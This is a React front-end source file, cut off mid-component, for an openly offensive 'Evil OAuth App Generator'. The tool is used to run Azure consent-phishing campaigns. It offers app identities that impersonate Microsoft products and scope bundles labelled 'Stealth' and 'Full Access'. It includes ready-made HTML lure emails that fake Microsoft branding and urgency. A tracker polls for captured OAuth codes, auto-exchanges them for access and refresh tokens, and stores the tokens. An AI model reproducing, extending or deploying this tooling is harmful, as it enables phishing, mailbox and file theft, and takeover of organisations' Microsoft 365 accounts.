import { useState, useEffect, useCallback, useRef } from 'react';
import {
  Box, Flex, Text, Heading, Button, Input, Grid, IconButton, useToast, SimpleGrid,
} from '@chakra-ui/react';
import { motion, AnimatePresence } from 'framer-motion';
import { CopyIcon, ExternalLinkIcon, DeleteIcon, RepeatIcon, CheckIcon } from '@chakra-ui/icons';

const MotionBox = motion(Box);

// ── Colors ────────────────────────────────────────────────────────────────────
const GREEN  = '#68D391';
const BLUE   = '#63B3ED';
const RED    = '#FC8181';
const ORANGE = '#F6AD55';
const PURPLE = '#9F7AEA';
const CYAN   = '#76E4F7';

// ── API helper ────────────────────────────────────────────────────────────────
const api = (path, opts = {}) => {
  const tok = localStorage.getItem('token');
  return fetch(`/api${path}`, {
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${tok}`, ...(opts.headers || {}) },
    ...opts,
  }).then(r => r.json());
};

// ── Input style ───────────────────────────────────────────────────────────────
const inputSx = {
  variant: 'unstyled',
  bg: 'rgba(255,255,255,0.05)',
  border: '1px solid rgba(255,255,255,0.1)',
  borderRadius: '10px',
  px: 4, h: '40px', fontSize: 'sm',
  color: 'var(--dash-text-primary)',
  _placeholder: { color: 'var(--dash-text-muted)' },
  _hover: { border: `1px solid ${BLUE}50` },
  _focus: { border: `1px solid ${BLUE}80`, boxShadow: `0 0 0 1px ${BLUE}40` },
};

// ── Label ─────────────────────────────────────────────────────────────────────
const Label = ({ children }) => (
  <Text fontSize="10px" color="var(--dash-text-muted)" textTransform="uppercase"
    letterSpacing="wider" fontWeight="bold" mb={1.5}>{children}</Text>
);

// ── Tab button ────────────────────────────────────────────────────────────────
const TabBtn = ({ label, active, color, onClick, badge }) => (
  <Button size="sm" variant="ghost" borderRadius="8px"
    color={active ? color : 'var(--dash-text-muted)'}
    bg={active ? `${color}18` : 'transparent'}
    border={active ? `1px solid ${color}40` : '1px solid transparent'}
    fontWeight={active ? 'semibold' : 'normal'}
    fontSize="12px" px={4}
    _hover={{ bg: `${color}12`, color }}
    onClick={onClick}>
    {label}
    {badge > 0 && (
      <Box ml={2} bg={RED} borderRadius="full" px="5px" fontSize="10px"
        fontWeight="bold" color="white" lineHeight="18px" h="18px"
        display="inline-flex" alignItems="center">{badge}</Box>
    )}
  </Button>
);

// ── App preset SVG icons ──────────────────────────────────────────────────────
const PresetIconBox = ({ color, children }) => (
  <Flex w="32px" h="32px" borderRadius="8px" bg={`${color}18`} border={`1px solid ${color}30`}
    align="center" justify="center" flexShrink={0}>
    <Box as="svg" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="1.8"
      strokeLinecap="round" strokeLinejoin="round" w="15px" h="15px">
      {children}
    </Box>
  </Flex>
);

const APP_PRESETS = [
  {
    name: 'Microsoft Teams Meeting Add-in',
    desc: 'Extend Teams with seamless meeting integrations and calendar sync',
    color: '#6264A7',
    icon: <><rect x="2" y="7" width="13" height="10" rx="2"/><polyline points="15 10 20 7 20 17 15 14"/></>,
  },
  {
    name: 'SharePoint Document Sync',
    desc: 'Sync and manage SharePoint documents across all your devices',
    color: '#0078D4',
    icon: <><polygon points="12 2 2 7 12 12 22 7"/><polyline points="2 17 12 22 22 17"/><polyline points="2 12 12 17 22 12"/></>,
  },
  {
    name: 'Microsoft 365 Security Analyzer',
    desc: 'Analyze your Microsoft 365 tenant for security gaps and compliance',
    color: '#C8372D',
    icon: <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>,
  },
  {
    name: 'Azure AD Identity Governance Tool',
    desc: 'Manage identity lifecycle, access reviews and entitlement management',
    color: '#0078D4',
    icon: <><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/><polyline points="16 11 18 13 22 9"/></>,
  },
  {
    name: 'OneDrive Business Backup',
    desc: 'Enterprise-grade backup solution for OneDrive and SharePoint data',
    color: '#0364B8',
    icon: <><path d="M18 10h-1.26A8 8 0 1 0 9 20h9a5 5 0 0 0 0-10z"/><polyline points="16 16 12 12 8 16"/><line x1="12" y1="12" x2="12" y2="21"/></>,
  },
  {
    name: 'Microsoft Compliance Scanner',
    desc: 'Scan your tenant for compliance violations and generate reports',
    color: '#107C10',
    icon: <><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"/><rect x="8" y="2" width="8" height="4" rx="1"/><polyline points="9 12 11 14 15 10"/></>,
  },
  {
    name: 'Teams Phone System Integration',
    desc: 'Integrate telephony and calling features with Microsoft Teams',
    color: '#6264A7',
    icon: <><path d="M3 18v-6a9 9 0 0 1 18 0v6"/><path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3z"/><path d="M3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z"/></>,
  },
  {
    name: 'Intune Device Configuration',
    desc: 'Configure and manage device policies via Microsoft Intune',
    color: '#0078D4',
    icon: <><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></>,
  },
  {
    name: 'Azure Monitor Alert Manager',
    desc: 'Manage and route Azure Monitor alerts to preferred channels',
    color: '#F6AD55',
    icon: <><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></>,
  },
  {
    name: 'Microsoft Entra Connector',
    desc: 'Connect and synchronize identities with Microsoft Entra ID',
    color: '#00BCF2',
    icon: <><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></>,
  },
  {
    name: 'Power Automate Connector',
    desc: 'Build automated workflows integrating Microsoft 365 services',
    color: '#0066FF',
    icon: <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>,
  },
  {
    name: 'Viva Insights Integration',
    desc: 'Access productivity analytics and insights from Microsoft Viva',
    color: '#9B30FF',
    icon: <><line x1="18" y1="20" x2="18" y2="10"/><line x1="12" y1="20" x2="12" y2="4"/><line x1="6" y1="20" x2="6" y2="14"/></>,
  },
];

// ── Scope groups ──────────────────────────────────────────────────────────────
const SCOPE_GROUPS = {
  'User & Profile': [
    { scope: 'openid',                  desc: 'Sign-in / ID token',                        risk: 'low'      },
    { scope: 'profile',                 desc: 'Basic profile info',                        risk: 'low'      },
    { scope: 'email',                   desc: 'Read email address',                        risk: 'low'      },
    { scope: 'User.Read',               desc: 'Signed-in user profile',                    risk: 'low'      },
    { scope: 'User.ReadBasic.All',      desc: 'All users basic profiles',                  risk: 'medium'   },
    { scope: 'User.ReadWrite.All',      desc: 'Read & write all user profiles',            risk: 'critical' },
  ],
  'Mail': [
    { scope: 'Mail.Read',               desc: 'Read all mailboxes',                        risk: 'high'     },
    { scope: 'Mail.ReadWrite',          desc: 'Read & write all mail',                     risk: 'critical' },
    { scope: 'Mail.Send',               desc: 'Send mail as any user',                     risk: 'critical' },
    { scope: 'MailboxSettings.ReadWrite', desc: 'Read & write mailbox settings',           risk: 'high'     },
  ],
  'Files & OneDrive': [
    { scope: 'Files.Read.All',          desc: 'Read all files',                            risk: 'high'     },
    { scope: 'Files.ReadWrite.All',     desc: 'Read & write all files',                    risk: 'critical' },
    { scope: 'Sites.ReadWrite.All',     desc: 'Read & write all SharePoint sites',         risk: 'critical' },
  ],
  'Calendar & Contacts': [
    { scope: 'Calendars.ReadWrite',     desc: 'Read & write user calendars',               risk: 'high'     },
    { scope: 'Contacts.ReadWrite',      desc: 'Read & write user contacts',                risk: 'high'     },
  ],
  'Directory & Groups': [
    { scope: 'Directory.Read.All',      desc: 'Read entire directory',                     risk: 'high'     },
    { scope: 'Directory.ReadWrite.All', desc: 'Read & write entire directory',             risk: 'critical' },
    { scope: 'Group.ReadWrite.All',     desc: 'Manage all groups & memberships',           risk: 'critical' },
  ],
  'Teams': [
    { scope: 'Chat.ReadWrite',          desc: 'Read & write Teams chats',                  risk: 'high'     },
    { scope: 'ChannelMessage.Send',     desc: 'Send channel messages',                     risk: 'high'     },
    { scope: 'Team.ReadBasic.All',      desc: 'List all teams',                            risk: 'medium'   },
  ],
  'Admin & Governance': [
    { scope: 'RoleManagement.ReadWrite.Directory', desc: 'Manage Azure AD role assignments', risk: 'critical' },
    { scope: 'Application.ReadWrite.All',          desc: 'Manage app registrations / SPs',   risk: 'critical' },
    { scope: 'Policy.ReadWrite.All',               desc: 'Read & write all policies',        risk: 'critical' },
    { scope: 'AuditLog.Read.All',                  desc: 'Read all audit logs',              risk: 'high'     },
    { scope: 'SecurityEvents.ReadWrite.All',        desc: 'Read & write security events',    risk: 'critical' },
  ],
};

const HIGH_VALUE_PACK  = ['openid','profile','email','Mail.ReadWrite','Mail.Send','Files.ReadWrite.All','Directory.Read.All','User.ReadBasic.All'];
const STEALTH_PACK     = ['openid','profile','email','User.Read','Mail.Read','Calendars.ReadWrite'];
const FULL_ACCESS_PACK = ['openid','profile','email','Mail.ReadWrite','Mail.Send','Files.ReadWrite.All','Directory.ReadWrite.All','Group.ReadWrite.All','Chat.ReadWrite','RoleManagement.ReadWrite.Directory'];

const RISK_COLOR = { low: GREEN, medium: ORANGE, high: RED, critical: '#F56565' };
const RISK_BG    = { low: `${GREEN}12`, medium: `${ORANGE}12`, high: `${RED}12`, critical: 'rgba(245,101,101,0.12)' };

// ── Phishing lure templates ───────────────────────────────────────────────────
function makeTemplates(appName, url) {
  const btn = (bg, text) =>
    `<div style="text-align:center;margin:24px 0"><a href="${url}" style="background:${bg};color:#fff;padding:12px 28px;border-radius:2px;text-decoration:none;font-size:14px;font-weight:600;display:inline-block">${text}</a></div>`;
  const wrap = (header, body) =>
    `<div style="font-family:'Segoe UI',Arial,sans-serif;max-width:600px;margin:0 auto">${header}<div style="padding:32px 24px;background:#fff">${body}<hr style="border:none;border-top:1px solid #edebe9;margin:24px 0"><p style="color:#605e5c;font-size:12px">If you did not expect this message, contact your IT helpdesk.</p></div><div style="background:#f3f2f1;padding:12px 24px;text-align:center"><p style="color:#605e5c;font-size:11px;margin:0">Microsoft Corporation &middot; One Microsoft Way &middot; Redmond, WA 98052</p></div></div>`;

  return [
    {
      id: 'it-notice', label: 'IT Admin Notice',
      subject: `ACTION REQUIRED: Authorize ${appName}`,
      html: wrap(
        `<div style="background:#0078d4;padding:20px 24px"><span style="color:#fff;font-size:16px;font-weight:600">Microsoft 365</span></div>`,
        `<h2 style="color:#1b1b1b;font-size:18px;margin-bottom:16px">Action Required: App Authorization Needed</h2><p style="color:#323130;font-size:14px;line-height:1.6;margin-bottom:16px">Your IT department has deployed <strong>${appName}</strong> to improve team productivity and security compliance. To complete activation for your account, you must authorize the application within <strong>24 hours</strong>.</p><p style="color:#323130;font-size:14px;line-height:1.6;margin-bottom:0">Click the button below to review and accept the required permissions. This is a one-time action.</p>${btn('#0078d4', `Authorize ${appName}`)}`
      ),
    },
    {
      id: 'security-alert', label: 'Security Alert',
      subject: `[Security] Review required: ${appName}`,
      html: wrap(
        `<div style="background:#d13438;padding:20px 24px"><span style="color:#fff;font-size:16px;font-weight:700">&#9888; Microsoft Security</span></div>`,
        `<h2 style="color:#1b1b1b;font-size:18px;margin-bottom:16px">Security Review &mdash; Immediate Action Required</h2><p style="color:#323130;font-size:14px;line-height:1.6;margin-bottom:16px">As part of our continuous security posture improvements, <strong>${appName}</strong> requires explicit re-authorization from all users. This is part of our Zero Trust compliance rollout.</p><p style="color:#323130;font-size:14px;line-height:1.6;margin-bottom:0">Failure to authorize before end of business today may result in reduced access to Microsoft 365 services.</p>${btn('#d13438', 'Complete Security Review')}<p style="color:#605e5c;font-size:12px;margin-top:8px">Reference ID: MS-SEC-${Math.random().toString(36).slice(2,10).toUpperCase()}</p>`
      ),
    },
    {
      id: 'productivity', label: 'Productivity Tool',
      subject: `Your team is now using ${appName} — get started today`,
      html: wrap(
        `<div style="background:#107c10;padding:20px 24px"><span style="color:#fff;font-size:16px;font-weight:600">Microsoft 365 Apps</span></div>`,
        `<h2 style="color:#1b1b1b;font-size:18px;margin-bottom:16px">Your team is using ${appName}</h2><p style="color:#323130;font-size:14px;line-height:1.6;margin-bottom:16px">Your organization has enabled <strong>${appName}</strong> for all employees. Connect your Microsoft account to unlock the full integration.</p><ul style="color:#323130;font-size:14px;line-height:2;margin-bottom:8px;padding-left:20px"><li>Sync your calendar and meetings automatically</li><li>Access shared documents from any device</li><li>Collaborate with your team in real time</li></ul>${btn('#107c10', 'Connect Your Account')}`
      ),
    },
    {
      id: 'teams-message', label: 'Teams Message',
      subject: `Teams notification: ${appName} needs authorization`,
      html: `<div style="font-family:'Segoe UI',Arial,sans-serif;max-width:600px;margin:0 auto;background:#fff;padding:24px"><div style="display:flex;align-items:center;gap:12px;margin-bottom:20px"><div style="width:40px;height:40px;background:#6264a7;border-radius:8px;display:flex;align-items:center;justify-content:center"><span style="color:#fff;font-size:20px">T</span></div><div><p style="margin:0;font-weight:600;color:#1b1b1b">Microsoft Teams</p><p style="margin:0;font-size:12px;color:#605e5c">IT Notifications</p></div></div><div style="background:#f5f5f5;border-radius:4px;padding:16px;margin-bottom:16px"><p style="margin:0 0 12px;font-size:14px;color:#1b1b1b"><strong>App Authorization Request</strong></p><p style="margin:0;font-size:13px;color:#323130;line-height:1.6">Hi there, <strong>${appName}</strong> has been deployed to your team and requires your authorization to function correctly. Please complete this step at your earliest convenience.</p></div><a href="${url}" style="background:#6264a7;color:#fff;padding:10px 20px;border-radius:4px;text-decoration:none;font-size:13px;font-weight:600;display:inline-block">Authorize Now</a><p style="font-size:11px;color:#a19f9d;margin-top:16px">You received this notification because your IT admin deployed ${appName} to your organization.</p></div>`,
    },
  ];
}

// ── Copy helper ───────────────────────────────────────────────────────────────
function useCopy() {
  const toast = useToast();
  return (text, label = 'Copied') =>
    navigator.clipboard.writeText(text).then(() =>
      toast({ title: label, status: 'success', duration: 1500, isClosable: true, position: 'top-right' })
    );
}

// ── Main component ────────────────────────────────────────────────────────────
export default function EvilOAuthView() {
  const copy  = useCopy();
  const toast = useToast();

  const [tab, setTab] = useState('builder');

  // App builder
  const [preset, setPreset]       = useState(null);
  const [appName, setAppName]     = useState('');
  const [clientId, setClientId]   = useState('');
  const [clientSecret, setSecret] = useState('');
  const [tenant, setTenant]       = useState('');
  const [redirectUri, setRedirectUri] = useState(
    () => window.location.origin.replace(':3000', ':5000') + '/api/evil-oauth/callback'
  );
  const [selectedScopes, setSelectedScopes] = useState(
    () => new Set(['openid', 'profile', 'email', 'Mail.ReadWrite', 'Mail.Send', 'Files.ReadWrite.All'])
  );
  const [generatedUrl, setGeneratedUrl] = useState('');
  const [generating, setGenerating]     = useState(false);

  // Phishing lures
  const [lureIdx, setLureIdx] = useState(0);

  // Capture tracker
  const [captures, setCaptures]   = useState([]);
  const [polling, setPolling]     = useState(false);
  const [autoExchange, setAuto]   = useState(false);
  const [excClientId, setExcCid]  = useState('');
  const [excSecret, setExcSec]    = useState('');
  const [excRedirect, setExcRedir] = useState('');
  const [excTenant, setExcTenant] = useState('organizations');
  const [exchangingId, setExchId] = useState(null);
  const pollRef = useRef(null);

  useEffect(() => {
    try {
      const s = JSON.parse(localStorage.getItem('evil_oauth_config') || '{}');
      if (s.clientId)     setClientId(s.clientId);
      if (s.clientSecret) setSecret(s.clientSecret);
      if (s.tenant)       setTenant(s.tenant);
      if (s.redirectUri)  setRedirectUri(s.redirectUri);
      if (s.appName)      setAppName(s.appName);
    } catch {}
  }, []);

  const saveConfig = useCallback(() => {
    localStorage.setItem('evil_oauth_config', JSON.stringify({ clientId, clientSecret, tenant, redirectUri, appName }));
  }, [clientId, clientSecret, tenant, redirectUri, appName]);

  const fetchCaptures = useCallback(async () => {
    try {
      const data = await api('/evil-oauth/captures');
      if (!Array.isArray(data)) return;
      setCaptures(data);
      if (autoExchange) {
        const cId  = excClientId.trim() || clientId;
        const cSec = excSecret.trim()   || clientSecret;
        const rUri = excRedirect.trim() || redirectUri;
        if (cId && cSec && rUri) {
          for (const c of data.filter(x => x.status === 'captured')) {
            api('/evil-oauth/exchange', {
              method: 'POST',
              body: JSON.stringify({ id: c.id, clientId: cId, clientSecret: cSec, redirectUri: rUri, tenant: excTenant }),
            }).catch(() => {});
          }
        }
      }
    } catch {}
  }, [autoExchange, excClientId, excSecret, excRedirect, excTenant, clientId, clientSecret, redirectUri]);

  useEffect(() => {
    if (polling) {
      fetchCaptures();
      pollRef.current = setInterval(fetchCaptures, 5000);
    } else {
      clearInterval(pollRef.current);
    }
    return () => clearInterval(pollRef.current);
  }, [polling, fetchCaptures]);

  const handleGenerateUrl = async () => {
    if (!clientId || !redirectUri) {
      toast({ title: 'Client ID and Redirect URI are required', status: 'warning', duration: 3000, position: 'top-right' });
      return;
    }
    setGenerating(true);
    try {
      const res = await api('/evil-oauth/generate-url', {
        method: 'POST',
        body: JSON.stringify({ clientId, scopes: [...selectedScopes], tenant, redirectUri }),
      });
      if (res.url) { setGeneratedUrl(res.url); saveConfig(); }
      else toast({ title: res.error || 'Failed', status: 'error', duration: 3000, position: 'top-right' });
    } catch {
      toast({ title: 'Request failed', status: 'error', duration: 3000, position: 'top-right' });
    }
    setGenerating(false);
  };

  const handleExchange = async (capture) => {
    const cId  = excClientId.trim() || clientId;
    const cSec = excSecret.trim()   || clientSecret;
    const rUri = excRedirect.trim() || redirectUri;
    if (!cId || !cSec || !rUri) {
      toast({ title: 'Configure client credentials first', status: 'warning', duration: 3000, position: 'top-right' });
      return;
    }
    setExchId(capture.id);
    try {
      const res = await api('/evil-oauth/exchange', {
        method: 'POST',
        body: JSON.stringify({ id: capture.id, clientId: cId, clientSecret: cSec, redirectUri: rUri, tenant: excTenant }),
      });
      setCaptures(prev => prev.map(c => c.id === capture.id ? { ...c, ...res } : c));
      if (res.status === 'exchanged') {
        toast({ title: `Token captured${res.upn ? ` for ${res.upn}` : ''}`, status: 'success', duration: 3000, position: 'top-right' });
        if (res.tokenResponse?.access_token) {
          const existing = JSON.parse(localStorage.getItem('dc_tokens') || '[]');
          existing.push({
            id: `eoauth_${capture.id}`, access_token: res.tokenResponse.access_token,
            refresh_token: res.tokenResponse.refresh_token || null,
            expires_in: res.tokenResponse.expires_in || 3600,
            capturedAt: Date.now(),
            expiresAt: Date.now() + (res.tokenResponse.expires_in || 3600) * 1000,
            upn: res.upn || null, client: appName || 'Evil OAuth', source: 'evil-oauth',
          });
          localStorage.setItem('dc_tokens', JSON.stringify(existing));
        }
      } else if (res.status === 'failed') {
        toast({ title: res.error || 'Exchange failed', status: 'error', duration: 4000, position: 'top-right' });
      }
    } catch {
      toast({ title: 'Exchange request failed', status: 'error', duration: 3000, position: 'top-right' });
    }
    setExchId(null);
  };

  const handleDelete = async (id) => {
    await api(`/evil-oauth/captures/${id}`, { method: 'DELETE' });
    setCaptures(prev => prev.filter(c => c.id !== id));
  };

  const handleClearAll = async () => {
    await api('/evil-oauth/captures', { method: 'DELETE' });
    setCaptures([]);
  };

  const toggleScope = (scope) =>
    setSelectedScopes(prev => { const n = new Set(prev); n.has(scope) ? n.delete(scope) : n.add(scope); return n; });

  const pickPreset = (p) => { setPreset(p.name); setAppName(p.name); };

  const lures         = makeTemplates(appName || 'Microsoft 365 App', generatedUrl || '#');
  const lure          = lures[lureIdx] || lures[0];
  const totalCap      = captures.length;
  const numCaptured   = captures.filter(c => c.status === 'captured').length;
  const numExchanged  = captures.filter(c => c.status === 'exchanged').length;
  const numFailed     = captures.filter(c => ['failed','error'].includes(c.status)).length;

  const tenantOpts = [['organizations', GREEN], ['common', ORANGE], ['consumers', BLUE]];

  return (
    <Box px={6} pb={12}>
      {/* Header */}
      <MotionBox initial={{ opacity: 0, y: -10 }} animate={{ opacity: 1, y: 0 }} mb={6}>
        <Heading fontSize="2xl" fontWeight="bold" color="var(--dash-text-primary)" lineHeight={1.2}>
          Evil <Text as="span" color="red.400">OAuth</Text> App Generator
        </Heading>
        <Text fontSize="12px" color="var(--dash-text-secondary)" mt={1}>
          Craft convincing Azure consent phishing apps · capture OAuth codes · auto-exchange for tokens
        </Text>
      </MotionBox>

      {/* Tabs */}
      <MotionBox initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.05 }} mb={5}>
        <Flex gap={2}>
          <TabBtn label="App Builder"      active={tab === 'builder'}   color={PURPLE} onClick={() => setTab('builder')} />
          <TabBtn label="Phishing Lures"   active={tab === 'lures'}     color={ORANGE} onClick={() => setTab('lures')} />
          <TabBtn label="Capture Tracker"  active={tab === 'captures'}  color={GREEN}  onClick={() => setTab('captures')} badge={totalCap} />
          <TabBtn label="Reference"        active={tab === 'reference'} color={BLUE}   onClick={() => setTab('reference')} />
        </Flex>
      </MotionBox>

      <AnimatePresence mode="wait">

        {/* ── App Builder ──────────────────────────────────────────────────── */}
        {tab === 'builder' && (
          <MotionBox key="builder" initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}>
            {/* Preset grid */}
            <Box bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)"
              borderRadius="14px" overflow="hidden" mb={4}>
              <Box h="2px" style={{ background: `linear-gradient(to right, transparent, ${PURPLE}80, transparent)` }} />
              <Box p={4}>
                <Flex align="center" justify="space-between" mb={3}>
                  <Text fontSize="13px" fontWeight="semibold" color="var(--dash-text-primary)">App Presets</Text>
                  <Text fontSize="11px" color="var(--dash-text-muted)">Select a convincing Microsoft app identity</Text>
                </Flex>
                <Grid templateColumns="repeat(auto-fill, minmax(215px, 1fr))" gap={2}>
                  {APP_PRESETS.map(p => (
                    <Box key={p.name} p={3} borderRadius="10px" cursor="pointer"
                      bg={preset === p.name ? `${p.color}12` : 'rgba(255,255,255,0.03)'}
                      border={preset === p.name ? `1px solid ${p.color}40` : '1px solid rgba(255,255,255,0.06)'}
                      onClick={() => pickPreset(p)} transition="all 0.15s"
                      _hover={{ bg: `${p.color}09`, borderColor: `${p.color}30` }}>
                      <Flex align="center" gap={2.5} mb={1.5}>
                        <PresetIconBox color={p.color}>{p.icon}</PresetIconBox>
                        <Text fontSize="11px" fontWeight="semibold" noOfLines={1}>{p.name}</Text>
                      </Flex>
                      <Text fontSize="10px" color="var(--dash-text-muted)" noOfLines={2} pl="44px">{p.desc}</Text>
                    </Box>
                  ))}
                </Grid>
              </Box>
            </Box>

            <Flex gap={4} align="flex-start">
              {/* Credentials */}
              <Box bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)"
                borderRadius="14px" overflow="hidden" flex="1">
                <Box h="2px" style={{ background: `linear-gradient(to right, transparent, ${BLUE}80, transparent)` }} />
                <Box p={4}>
                  <Text fontSize="13px" fontWeight="semibold" color="var(--dash-text-primary)" mb={4}>App Credentials</Text>
                  <Box mb={3}>
                    <Label>Display Name</Label>
                    <Input {...inputSx} value={appName} onChange={e => setAppName(e.target.value)}
                      placeholder="e.g. Microsoft Teams Meeting Add-in" />
                  </Box>
                  <Box mb={3}>
                    <Label>Client ID *</Label>
                    <Input {...inputSx} value={clientId} onChange={e => setClientId(e.target.value)}
                      placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx" fontFamily="mono" fontSize="sm" />
                  </Box>
                  <Box mb={3}>
                    <Label>Client Secret (for code exchange)</Label>
                    <Input {...inputSx} type="password" value={clientSecret} onChange={e => setSecret(e.target.value)}
                      placeholder="Your app secret" fontFamily="mono" />
                  </Box>
                  <Box mb={3}>
                    <Label>Redirect URI *</Label>
                    <Input {...inputSx} value={redirectUri} onChange={e => setRedirectUri(e.target.value)}
                      fontFamily="mono" fontSize="xs" />
                    <Text fontSize="10px" color="var(--dash-text-muted)" mt={1}>
                      Must be registered in Azure Portal. Use ngrok/Cloudflare Tunnel for local dev.
                    </Text>
                  </Box>
                  <Box>
                    <Label>Tenant</Label>
                    <Flex gap={2} wrap="wrap">
                      {tenantOpts.map(([t, c]) => (
                        <Button key={t} size="xs" onClick={() => setTenant(t)}
                          bg={tenant === t ? `${c}18` : 'rgba(255,255,255,0.04)'}
                          color={tenant === t ? c : 'var(--dash-text-muted)'}
                          border={`1px solid ${tenant === t ? `${c}45` : 'rgba(255,255,255,0.08)'}`}
                          _hover={{ bg: `${c}12`, color: c }} borderRadius="8px" fontWeight={tenant === t ? 'semibold' : 'normal'}
                        >{t}</Button>
                      ))}
                      <Input {...inputSx} size="xs" flex="1" minW="120px" h="26px" px={3} fontSize="xs"
                        value={!tenantOpts.map(x => x[0]).includes(tenant) ? tenant : ''}
                        onChange={e => { if (e.target.value) setTenant(e.target.value); }}
                        placeholder="tenant-id or domain" fontFamily="mono" />
                    </Flex>
                  </Box>
                </Box>
              </Box>

              {/* Scope selector */}
              <Box bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)"
                borderRadius="14px" overflow="hidden" flex="1.3">
                <Box h="2px" style={{ background: `linear-gradient(to right, transparent, ${GREEN}80, transparent)` }} />
                <Box p={4}>
                  <Flex align="center" justify="space-between" mb={3}>
                    <Text fontSize="13px" fontWeight="semibold" color="var(--dash-text-primary)">Scope Selector</Text>
                    <Flex gap={2}>
                      {[['High Value', HIGH_VALUE_PACK, ORANGE], ['Stealth', STEALTH_PACK, CYAN], ['Full Access', FULL_ACCESS_PACK, RED]].map(([lbl, pack, c]) => (
                        <Button key={lbl} size="xs" onClick={() => setSelectedScopes(new Set(pack))}
                          bg={`${c}12`} color={c} border={`1px solid ${c}30`}
                          _hover={{ bg: `${c}20` }} borderRadius="6px" fontSize="10px">{lbl}</Button>
                      ))}
                      <Button size="xs" onClick={() => setSelectedScopes(new Set())}
                        bg="rgba(255,255,255,0.04)" color="var(--dash-text-muted)"
                        _hover={{ bg: `${RED}10`, color: RED }}
                        border="1px solid rgba(255,255,255,0.08)" borderRadius="6px" fontSize="10px"
                      >Clear</Button>
                    </Flex>
                  </Flex>

                  <Box maxH="300px" overflowY="auto" pr={1}
                    css={{ '&::-webkit-scrollbar': { width: '3px' }, '&::-webkit-scrollbar-thumb': { background: 'rgba(255,255,255,0.1)', borderRadius: '3px' } }}>
                    {Object.entries(SCOPE_GROUPS).map(([group, scopes]) => (
                      <Box key={group} mb={3}>
                        <Text fontSize="9px" fontWeight="bold" letterSpacing="widest" color="var(--dash-text-muted)"
                          textTransform="uppercase" mb={1} px={1}>{group}</Text>
                        {scopes.map(({ scope, desc, risk }) => {
                          const active = selectedScopes.has(scope);
                          return (
                            <Flex key={scope} align="center" gap={2} py={1} px={2} borderRadius="6px"
                              bg={active ? RISK_BG[risk] : 'transparent'}
                              cursor="pointer" onClick={() => toggleScope(scope)}
                              _hover={{ bg: active ? RISK_BG[risk] : 'rgba(255,255,255,0.04)' }}
                              transition="background 0.1s">
                              <Box w="14px" h="14px" borderRadius="3px" flexShrink={0}
                                bg={active ? RISK_COLOR[risk] : 'transparent'}
                                border={`1.5px solid ${active ? RISK_COLOR[risk] : 'rgba(255,255,255,0.18)'}`}
                                display="flex" alignItems="center" justifyContent="center">
                                {active && <Box w="7px" h="7px" borderRadius="1px" bg="white" />}
                              </Box>
                              <Text fontSize="12px" fontFamily="mono" flex="1" noOfLines={1}>{scope}</Text>
                              <Text fontSize="10px" color="var(--dash-text-muted)" flex="1.4" noOfLines={1}>{desc}</Text>
                              <Box px={1.5} py="1px" borderRadius="4px"
                                bg={RISK_BG[risk]} border={`1px solid ${RISK_COLOR[risk]}35`} flexShrink={0}>
                                <Text fontSize="9px" color={RISK_COLOR[risk]} fontWeight="bold" textTransform="uppercase">{risk}</Text>
                              </Box>
                            </Flex>
                          );
                        })}
                      </Box>
                    ))}
                  </Box>

                  <Box mt={3} p={3} bg="rgba(0,0,0,0.25)" borderRadius="8px" border="1px solid rgba(255,255,255,0.07)">
                    <Label>Active scopes ({selectedScopes.size})</Label>
                    <Text fontSize="11px" fontFamily="mono" color={GREEN} lineHeight="1.9" wordBreak="break-all">
                      {[...selectedScopes].join('\n') || '—'}
                    </Text>
                  </Box>
                </Box>
              </Box>
            </Flex>

            {/* Generate */}
            <Box bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)"
              borderRadius="14px" overflow="hidden" mt={4}>
              <Box h="2px" style={{ background: `linear-gradient(to right, transparent, ${RED}70, transparent)` }} />
              <Box p={4}>
                <Flex align="center" gap={4} mb={generatedUrl ? 4 : 0}>
                  <Button h="40px" px={8} borderRadius="10px" isLoading={generating}
                    bg={`${RED}18`} border={`1px solid ${RED}45`} color={RED}
                    _hover={{ bg: `${RED}28` }} fontWeight="semibold"
                    onClick={handleGenerateUrl}>
                    Generate Consent URL
                  </Button>
                  <Text fontSize="12px" color="var(--dash-text-muted)">
                    Builds the OAuth authorization URL with your selected scopes
                  </Text>
                </Flex>
                {generatedUrl && (
                  <Box p={3} bg={`${GREEN}06`} border={`1px solid ${GREEN}25`} borderRadius="10px">
                    <Flex align="center" justify="space-between" mb={2}>
                      <Flex align="center" gap={2}>
                        <CheckIcon boxSize={3} color={GREEN} />
                        <Text fontSize="11px" fontWeight="semibold" color={GREEN}>Consent URL Ready</Text>
                      </Flex>
                      <Flex gap={2}>
                        <Button size="xs" leftIcon={<CopyIcon />} onClick={() => copy(generatedUrl, 'URL copied!')}
                          bg={`${GREEN}15`} color={GREEN} border={`1px solid ${GREEN}30`}
                          _hover={{ bg: `${GREEN}25` }} borderRadius="7px">Copy</Button>
                        <Button size="xs" leftIcon={<ExternalLinkIcon />} onClick={() => window.open(generatedUrl, '_blank')}
                          bg="rgba(255,255,255,0.05)" color="var(--dash-text-muted)"
